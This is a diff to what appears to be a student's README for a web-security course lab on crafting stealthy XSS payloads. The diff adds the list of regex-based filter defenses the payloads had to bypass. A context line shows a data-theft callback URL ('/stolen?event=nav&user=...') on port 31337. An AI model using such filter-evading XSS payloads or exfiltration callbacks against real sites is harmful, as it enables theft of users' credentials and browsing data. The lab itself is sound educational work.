@@ -577,6 +577,13 @@ I elected to export the PCAP as JSON and simply parse the captures by *key*:*val
 
 ### [xss_payload.html](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/xss_payload.html)
 > **The goal was to construct URLs that execute a Cross Site payload in four defense cases 0 - 3.**    
+>> **<ins>The defenses are as follows</ins>:**    
+>>> **\- 0: No defense**    
+>>> **\- 1: Remove "script": `filtered = re.sub(r"(?i)script", "", input)`**    
+>>> **\- 2: Remove several tags: `filtered = re.sub(r"(?i)script|<img|<body|<style|<meta|<embed|<object", "", input)`**    
+>>> **\- 3: Remove some punctuation: `filtered = re.sub(r"[;’\"]", "", input)`**    
+>>> **\- 4: Encode < and >: `input.replace("<", "&lt;").replace(">", "&gt;")` *extra credit***    
+>>
 > **<ins>Additionally, we needed to meet the following criteria</ins>:**    
 >> ***Stealth*:**    
 >>> **\- "Display all pages correctly, with no significant evidence of attack."**    
@@ -599,9 +606,9 @@ I elected to export the PCAP as JSON and simply parse the captures by *key*:*val
 >>>> \- `http://192.168.1.1:31337/stolen?event=nav&user=<username>&url=<encoded_url>`     
 > 
 > **For the sake of space, I won't break out all of `xss_payload.html` here.**    
-> **Comments throughout source should associate the purpose of functions with the criteria listed above.**    
+> **Comments throughout source associate the purpose of functions with the criteria listed above.**    
 >
-> **Below is snip of the HTML `<style>` to generate a reasonably benign looking site; and, a snip of the functions which generate the payloads as links in each of the icons found in the screen shot after the code.**     
+> **Below is a snip of the HTML `<style>` to generate a reasonably benign looking site; and, a snip of the functions which generate the payloads as links in each of the icons found in the screen shot after the code.**     
 >> ```html
 >> <meta charset="utf-8">
 >> <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
@@ -651,4 +658,6 @@ I elected to export the PCAP as JSON and simply parse the captures by *key*:*val
 > ![Bungle](https://github.com/user-attachments/assets/731a28f9-9508-4d05-9911-e495975e1c74)    
 >    
 ### [cors_server.py](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/cors_server.py)
+### 🚧
 ### [csrf_0.html](https://github.com/plmcdowe/52600/blob/ed4b61dbb8067082c3c6ec5d86f9f5ef0145be79/2b-SQL-XSS-CSRF/csrf_0.html)
+### 🚧
